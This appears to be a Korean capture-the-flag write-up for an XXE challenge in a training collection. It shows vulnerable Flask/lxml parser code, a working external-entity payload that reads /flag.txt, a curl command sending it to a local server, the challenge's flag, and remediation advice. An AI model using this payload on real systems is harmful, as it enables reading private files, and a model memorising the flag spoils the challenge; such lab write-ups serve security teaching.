# [injection] XXE 라이트업

- 대상: `arang-edu-challs-collection` / `challenges/injection/xxe-1`
- 카테고리: injection
- 버그클래스: XML External Entity (XXE)
- 포트: 9208

## 취약점 분석

`challenges/injection/xxe-1/app.py`:

```python
open("/flag.txt", "w").write(os.environ.get("FLAG_XXE_1", "flag{local}"))
...
@app.route("/order", methods=["POST"])
def order():
    data = request.get_data()
    parser = etree.XMLParser(resolve_entities=True, load_dtd=True, no_network=True)
    parser.resolvers.add(SafeFileResolver())
    doc = etree.fromstring(data, parser)   # XXE sink
    name = doc.findtext("name")
    return "주문자: " + (name or "?")
```

`/order` 엔드포인트가 사용자가 보낸 XML을 `resolve_entities=True, load_dtd=True`로 파싱한다. 이 설정에서는 XML 내부의 `DOCTYPE`으로 정의한 외부 엔티티(SYSTEM)가 그대로 확장(로컬 파일 읽기)된다. `no_network=True`로 원격 URL 스킴은 막혀있지만, `file://` 로컬 파일 읽기는 커스텀 `SafeFileResolver`가 그대로 허용한다(디렉터리/특수 파일만 막고, 일반 파일은 최대 64KB까지 읽어서 반환). flag는 `/flag.txt`에 저장되어 있다.

## 익스플로잇

```xml
<?xml version="1.0"?>
<!DOCTYPE order [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<order><name>&xxe;</name></order>
```

`&xxe;` 엔티티가 `/flag.txt` 파일 내용으로 치환되고, 서버는 `<name>` 값을 그대로 응답에 반영하므로 flag가 그대로 노출된다.

### 실행

```bash
cat > order.xml <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE order [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<order><name>&xxe;</name></order>
EOF

curl -XPOST --data-binary @order.xml http://localhost:9208/order
```

(브라우저 폼의 textarea에 같은 XML을 붙여넣고 "전송" 버튼을 눌러도 동일하게 동작한다.)

## 진행 절차

1. `docker compose up -d --build xxe-1`
2. `http://localhost:9208` 페이지의 XML 입력창에 위 페이로드 붙여넣고 "전송" 클릭 (또는 curl로 전송)
3. 응답 "주문자: flag{...}"에서 flag 확인

## 플래그

```
flag{32b3ad5150d4d2349d01}
```

## 대응방안

- XML 파서에서 외부 엔티티/DTD 처리를 기본적으로 비활성화 (`resolve_entities=False`, DTD 로딩 자체를 금지)
- 네트워크 접근이 필요 없다면 `no_network=True`뿐 아니라 로컬 파일 스킴(`file://`)도 리졸버 단계에서 차단
- 신뢰할 수 없는 XML 입력은 안전한 파서 프리셋(예: `defusedxml`) 사용을 우선 검토
- 애플리케이션에 XML DTD/엔티티 기능이 실제로 필요한지 검토하고, 불필요하면 완전히 꺼둘 것
